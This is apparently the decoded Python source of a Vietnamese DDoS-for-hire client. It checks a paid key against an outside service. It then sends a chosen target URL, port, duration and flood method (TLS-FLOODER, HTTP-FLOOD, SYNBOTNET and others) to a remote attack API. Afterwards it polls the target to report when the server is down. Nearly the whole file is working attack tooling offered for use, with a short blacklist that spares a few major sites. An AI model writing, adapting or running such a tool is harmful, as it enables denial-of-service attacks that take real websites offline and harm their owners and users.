#Decode By Nguyen Le Tri Loc ( Vodka Coder )
#Type File: CodeDieu.py
#Encode: Berserker [Billythegoat]
import os
import time
import requests
import sys
from colorama import init, Fore, Back

class ThanhDieuMainDDOS_0xca1:
    def __init__(self, key):
        os.system("cls")
        os.system("title TDTV1 - Tool DDoS API cURL")
        self.host = None
        self.portnum = None
        self.threads = None
        self.key = key

    def thanhdieu_welcome__(self):
        os.system("cls")
        banner = """  
         ═══════════════════════════════════════════════════════════                                  
        """
        print(Fore.YELLOW + banner)
        print(Fore.WHITE + "ㅤㅤ             ㅤ ╲ WELCOME TO TOOL DDOS API ╱")
        print(
            Fore.WHITE
            + "ㅤㅤㅤㅤ[+] All Method: TLS-FLOODER - HTTP-LOAD - DESTROY - HTTP-FLOOD - HTTP-RAW - HTTP-BYPASS - SYNBOTNET"
        )
        print(Fore.WHITE + "ㅤㅤㅤㅤ[+] Example Target: https://example.com/ 443 60")
        print(Fore.WHITE + "ㅤㅤㅤㅤ[+] Get Key Free: https://thanhdieu.com/key.php?=getkey")
        print(Fore.YELLOW + banner)

    def thanhdieu_main__(self, ngayhethan):
        os.system("cls")
        banner = """
          ████████╗    ██████╗     ████████╗    ██╗   ██╗    ██████╗ 
          ╚══██╔══╝    ██╔══██╗    ╚══██╔══╝    ██║   ██║    ╚════██╗
             ██║       ██║  ██║       ██║       ██║   ██║     █████╔╝
             ██║       ██║  ██║       ██║       ╚██╗ ██╔╝    ██╔═══╝ 
             ██║       ██████╔╝       ██║        ╚████╔╝     ███████╗
             ╚═╝       ╚═════╝        ╚═╝         ╚═══╝      ╚══════╝
                                  
        """
        print(Fore.RED + banner)
        print(
            Fore.YELLOW
            + "ㅤㅤㅤㅤㅤㅤ[+] An Advanced DDOS Tool Using API DDOS Written in Python [+]"
        )
        print(Fore.YELLOW + "ㅤㅤㅤㅤㅤㅤ[+] Developer: ThanhDieuTV [Manager]")
        print(Fore.YELLOW + "ㅤㅤㅤㅤㅤㅤ[+] Version Tool: V2.0.0")
        print(Fore.RED + f"ㅤㅤㅤㅤㅤㅤKey Expiration: {ngayhethan}")

    def chon_method(self):
        print(
            Fore.LIGHTMAGENTA_EX
            + "╔═══"
            + Fore.LIGHTMAGENTA_EX
            + "[Nhập"
            + Fore.LIGHTMAGENTA_EX
            + " "
            + Fore.LIGHTMAGENTA_EX
            + "Method"
            + Fore.LIGHTMAGENTA_EX
            + "]"
            + Fore.LIGHTMAGENTA_EX
        )

        default_method = "TLS-FLOODER"
        chon_method = input(f"[ Mặc Định ] => ({default_method})\n\x1b[38;2;0;255;189m> ")
    
        if not chon_method:
            chon_method = default_method
        else:
            chon_method = chon_method.strip()

        return chon_method

    def check_website(self, website_url):
        if website_url.startswith("https://") or website_url.startswith("http://"):
            return True
        else:
            return False

    def check_port(self, port):
        if port >= 80 and port <= 443:
            return True
        else:
            return False

    def check_thoigian(self, thoigian):
        if thoigian >= 30 and thoigian <= 60:
            return True
        else:
            return False

    def check_port_format(self, port_input):
        if port_input.isdigit():
            port = int(port_input)
            if self.check_port(port):
                return port
            else:
                print(Fore.RED + "Default port 443.")
        else:
            print(Fore.RED + "Port is not in the correct format.")
        return None

    def run_ddos_attack(self, website_url, port, thoigian, phuongphap):
        website_url = f"{website_url}:{port}"
        api_url = f"https://thanhdieu.com/API/thanhdieu-ddos.php?key={self.key}&port={port}&time={thoigian}&method={phuongphap}&host={website_url}"
        response = requests.get(api_url)
        if response.status_code == 200:
            thanhdieuattack_0xac2 = True
        else:
            thanhdieuattack_0xac2 = False
        code_mau = {"Send attack to": Fore.GREEN, "server is DOWN": Fore.RED}
        if thanhdieuattack_0xac2:
            start_time = time.time()
            elapsed_time = 0
            while elapsed_time < thoigian:
                print(
                    f"{Fore.GREEN}Send attack to{Fore.RESET} {website_url} -> [Method/{phuongphap}]"
                )
                if not self.__tdtv_checkwebsite(website_url):
                    print(f"Connect to => {website_url} \033[91mserver is DOWN\033[0m")
                    break
                time.sleep(0.02)
                elapsed_time = time.time() - start_time

            if not self.__tdtv_checkwebsite(website_url):
                print(f"Connect to => {website_url} \033[91mserver is DOWN\033[0m")
        else:
            start_time = time.time()
            elapsed_time = 0
            while elapsed_time < thoigian:
                print(
                    f"{code_mau['Fail Attack']}Fail Attack {website_url} -> [Target/{phuongphap}]"
                )
                if not self.__tdtv_checkwebsite(website_url):
                    print(f"Connect to => {website_url} \033[91mserver is DOWN\033[0m")
                    break

                time.sleep(0.2)
                elapsed_time = time.time() - start_time

        start_time = time.time()
        while time.time() - start_time < thoigian:
            if self.__tdtv_checkwebsite(website_url):
                print(f"\033[93mAttack time has been reached\033[0m")
                print(f"\033[93mExit Tool DDoS - Due to Time Expired\033[0m")
                sys.exit()
            else:
                print(f"Connect to => {website_url} \033[91mserver is DOWN\033[0m")
            time.sleep(0.2)

    def __tdtv_checkwebsite(self, website_url):
        try:
            response = requests.get(website_url)
            if response.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

blacklisted = [
    "https://usa.gov",
    "https://fbi.gov",
    "https://nasa.gov",
    "https://google.com",
    "https://translate.google.com",
    "https://thanhdieu.com",
    "https://github.com",
    "https://www.youtube.com",
    "https://www.facebook.com",
    "https://chat.openai.com",
    "https://shopee.vn",
    "https://mail.google.com",
    "https://tiktok.com",
    "https://instagram.com",
    "https://twitter.com",
]

def is_blacklisted(url):
    cleaned_url = url.replace("www.", "")
    return cleaned_url in blacklisted

def is_valid_url(url):
    if url.startswith("https://") or url.startswith("http://"):
        return True
    else:
        return False

def display_error_msg(error_msg):
    print(Fore.RED + f"Error: {error_msg}" + Fore.RESET)

if __name__ == "__main__":
    tool = ThanhDieuMainDDOS_0xca1(key=None)
    tool.thanhdieu_welcome__()

    key_file = "key.txt"
    ngayhethan = None

    if os.path.exists(key_file):
        with open(key_file, "r") as f:
            key = f.readline().strip()
    else:
        key = input(Fore.YELLOW + "Enter API Key: " + Fore.RESET)

    __thanhdieu_checkey = (
        f"https://thanhdieu.com/booster/api/check-key-ddos.php?key={key}"
    )
    response = requests.get(__thanhdieu_checkey)

    while response.status_code != 200 or response.json().get("status") != "success":
        error_msg = response.json().get("msg")
        if error_msg:
            display_error_msg(error_msg)
        else:
            print(Fore.RED + "Key does not exist or is invalid.")
        key = input(Fore.YELLOW + "Enter API Key: " + Fore.RESET)
        __thanhdieu_checkey = (
            f"https://thanhdieu.com/booster/api/check-key-ddos.php?key={key}"
        )
        response = requests.get(__thanhdieu_checkey)

    ngaytao = response.json().get("create")
    ngayhethan = response.json().get("end")

    if ngayhethan:
        time.sleep(1)
        print(Fore.GREEN + "Đã kích hoạt API KEY.")
        time.sleep(0.5)

        for i in range(3, 0, -1):
            print(Fore.YELLOW + f"Connect to panel ddos {i} seconds...")
            time.sleep(0.4)
    else:
        print(Fore.RED + "Key không tồn tại.")

    with open(key_file, "w") as f:
        f.write(key)

    if ngayhethan:
        tool = ThanhDieuMainDDOS_0xca1(key)
        tool.thanhdieu_main__(ngayhethan)
    method = tool.chon_method()
    while method not in ["TLS-FLOODER", "DESTROY","HTTP-FLOOD","HTTP-LOAD","HTTP-RAW","HTTP-BYPASS","SYNBOTNET"]:
        print(
            Fore.RED
            + "[+] Method All: 'TLS-FLOODER', 'HTTP-LOAD', 'DESTROY', 'HTTP-FLOOD', 'HTTP-RAW', 'SYNBOTNET', 'HTTP-BYPASS'."
        )
        method = tool.chon_method()

    pink_prompt = Fore.MAGENTA + "﹝•﹞" + Fore.RESET
    website_url = input(pink_prompt + "Target URL: ")
    while not is_valid_url(website_url) or is_blacklisted(website_url):
        if not is_valid_url(website_url):
            print(Fore.RED + "Vui lòng nhập một website hợp lệ.")
        elif is_blacklisted(website_url):
            print(Fore.RED + "Website này nằm trong danh sách cấm.")
        website_url = input(pink_prompt + "Target URL: ")

    while True:
        port_input = input(pink_prompt + "Target Port: ")
        if port_input.isdigit():
            port = int(port_input)
            if tool.check_port(port):
                break
            else:
                print(Fore.RED + "Default port 443.")
        else:
            print(Fore.RED + "Port is not in the correct format.")

    thoigian = int(input(pink_prompt + "Target Time: "))
    while not tool.check_thoigian(thoigian):
        print(Fore.RED + "Max time 30-60s.")
        thoigian = int(input(pink_prompt + "Target Time: "))

    tool.run_ddos_attack(website_url, port, thoigian, method)
